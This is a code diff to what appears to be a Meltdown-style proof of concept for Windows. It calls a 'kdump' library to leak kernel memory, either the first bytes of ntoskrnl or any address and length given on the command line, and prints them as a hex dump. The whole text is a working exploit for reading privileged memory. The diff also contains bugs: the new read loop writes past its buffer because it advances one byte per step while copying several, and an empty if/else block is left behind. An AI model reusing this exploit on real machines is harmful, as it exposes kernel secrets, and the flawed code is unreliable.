@@ -80,7 +80,7 @@ struct kernel_memory_iterator
 	}
 
 	bool operator==(const kernel_memory_iterator& rhs) const noexcept {
-		return base == rhs.base;
+		return base == rhs.base && offset == rhs.offset;
 	}
 
 	bool operator!=(const kernel_memory_iterator& rhs) const noexcept {
@@ -88,7 +88,10 @@ struct kernel_memory_iterator
 	}
 
 	kernel_memory_iterator& operator++() noexcept {
-		++base;
+		if(++offset == bytes_per_read) {
+			offset = 0;
+			base += bytes_per_read;
+		}
 		return *this;
 	}
 
@@ -98,13 +101,19 @@ struct kernel_memory_iterator
 		return k;
 	}
 
-	value_type operator*() const noexcept {
-		std::byte b = kdump::libkdump_read(reinterpret_cast<std::size_t>(base));
-		return b;
+	value_type operator*() noexcept {
+		if(offset == 0) {
+			buffer = kdump::libkdump_read(reinterpret_cast<std::size_t>(base));
+		}
+		return buffer[offset];
 	}
 
 private:
+	static constexpr std::size_t bytes_per_read = std::tuple_size_v<std::invoke_result_t<decltype(&kdump::libkdump_read), std::size_t>>;
+	std::array<std::byte, bytes_per_read> buffer;
+
 	std::byte* base = nullptr;
+	std::size_t offset = 0;
 };
 
 std::pair<void*, ULONG> get_kernel_base() {
@@ -129,7 +138,7 @@ int main(int argc, char* argv[]) {
 	::SetConsoleMode(output, mode);
 
 	kdump::libkdump_enable_debug(1);
-	kdump::libkdump_config_t config = kdump::libkdump_get_autoconfig();
+	kdump::config_t config = kdump::libkdump_get_autoconfig();
 	config.load_threads = 1;
 	config.load_type = kdump::NOP;
 	kdump::libkdump_init(config);
@@ -138,38 +147,60 @@ int main(int argc, char* argv[]) {
 	::SetThreadAffinityMask(::GetCurrentThread(), 0x1);
 	//::SetThreadPriority(::GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
 
-	if(argc < 2) {
-		const auto [kernel_base, kernel_size] = get_kernel_base();
-		const std::uint64_t bytes_to_leak = 32;
+	switch(argc) {
+	case 1:
+		{
+			const auto[kernel_base, kernel_size] = get_kernel_base();
+			const std::uint64_t bytes_to_leak = 32;
 
-		std::cout << "Leaking first " << bytes_to_leak << " bytes of ntoskrnl, out of a possible " << kernel_size << std::endl;
+			std::cout << "Leaking first " << bytes_to_leak << " bytes of ntoskrnl, out of a possible " << kernel_size << std::endl;
 
-		HMODULE ntoskrnl(::LoadLibraryW(L"ntoskrnl.exe"));
-		auto f = gsl::finally([=]() { ::FreeLibrary(ntoskrnl); });
+			HMODULE ntoskrnl(::LoadLibraryW(L"ntoskrnl.exe"));
+			auto f = gsl::finally([=]() { ::FreeLibrary(ntoskrnl); });
 
-		std::unique_ptr<std::byte[]> buffer = std::make_unique<std::byte[]>(bytes_to_leak);
-		for(std::size_t i = 0; i < bytes_to_leak; i++) {
-			buffer[i] = kdump::libkdump_read(reinterpret_cast<std::size_t>(static_cast<std::byte*>(kernel_base) + i));
+			std::unique_ptr<std::byte[]> buffer = std::make_unique<std::byte[]>(bytes_to_leak);
+			constexpr std::size_t bytes_per_read = std::tuple_size_v<std::invoke_result_t<decltype(&kdump::libkdump_read), std::size_t>>;
+			for(std::size_t i = 0; i < bytes_to_leak; i++) {
+				std::array<std::byte, bytes_per_read> bytes = kdump::libkdump_read(reinterpret_cast<std::size_t>(static_cast<std::byte*>(kernel_base) + i));
+				for(std::size_t j = 0; j < bytes_per_read; ++j) {
+					buffer[i + j] = bytes[j];
+				}
+			}
+
+			std::cout << "Leaked bytes:" << std::endl;
+			auto leaked = gsl::make_span(buffer.get(), bytes_to_leak);
+			hex_dump(output, kernel_base, leaked.begin(), leaked.end());
+			std::cout << "Actual ntoskrnl.exe bytes:" << std::endl;
+			auto actual = gsl::make_span(reinterpret_cast<std::byte*>(ntoskrnl), bytes_to_leak);
+			hex_dump(output, kernel_base, actual.begin(), actual.end());
 		}
-
-		std::cout << "Leaked bytes:" << std::endl;
-		auto leaked = gsl::make_span(buffer.get(), bytes_to_leak);
-		hex_dump(output, kernel_base, leaked.begin(), leaked.end());
-		std::cout << "Actual ntoskrnl.exe bytes:" << std::endl;
-		auto actual = gsl::make_span(reinterpret_cast<std::byte*>(ntoskrnl), bytes_to_leak);
-		hex_dump(output, kernel_base, actual.begin(), actual.end());
-	} else {
-		std::size_t target = std::strtoull(argv[1], nullptr, 16);
-		kernel_memory_iterator start = kernel_memory_iterator(reinterpret_cast<std::byte*>(target));
-		kernel_memory_iterator end = {};
-		if(argc == 3) {
-			std::size_t length = std::stoull(argv[2]);
-			end = kernel_memory_iterator(reinterpret_cast<std::byte*>(target) + length);
-			std::cout << "Leaking " << length << " bytes from address " << std::hex << std::nouppercase << reinterpret_cast<void*>(target) << std::endl;
-		} else {
+		break;
+	case 2:
+		{
+			std::size_t target = std::strtoull(argv[1], nullptr, 16);
 			std::cout << "Leaking all bytes from address " << std::hex << std::nouppercase << reinterpret_cast<void*>(target) << std::endl;
+
+			kernel_memory_iterator start = kernel_memory_iterator(reinterpret_cast<std::byte*>(target));
+			kernel_memory_iterator end = {};
+			hex_dump(output, reinterpret_cast<void*>(target), start, end);
 		}
-		hex_dump(output, reinterpret_cast<void*>(target), start, end);
+		break;
+	case 3:
+		{
+			const std::size_t target = std::strtoull(argv[1], nullptr, 16);
+			const std::size_t bytes_to_leak = std::stoull(argv[2]);
+			std::cout << "Leaking " << bytes_to_leak << " bytes from address " << std::hex << std::nouppercase << reinterpret_cast<void*>(target) << std::endl;
+
+			kernel_memory_iterator start = kernel_memory_iterator(reinterpret_cast<std::byte*>(target));
+			kernel_memory_iterator end = {};
+			end = kernel_memory_iterator(reinterpret_cast<std::byte*>(target) + bytes_to_leak);
+			hex_dump(output, reinterpret_cast<void*>(target), start, end);
+		}
+		break;
+	}
+
+	if(argc < 2) {
+	} else {
 	}
 	kdump::libkdump_cleanup();
 	return 0;
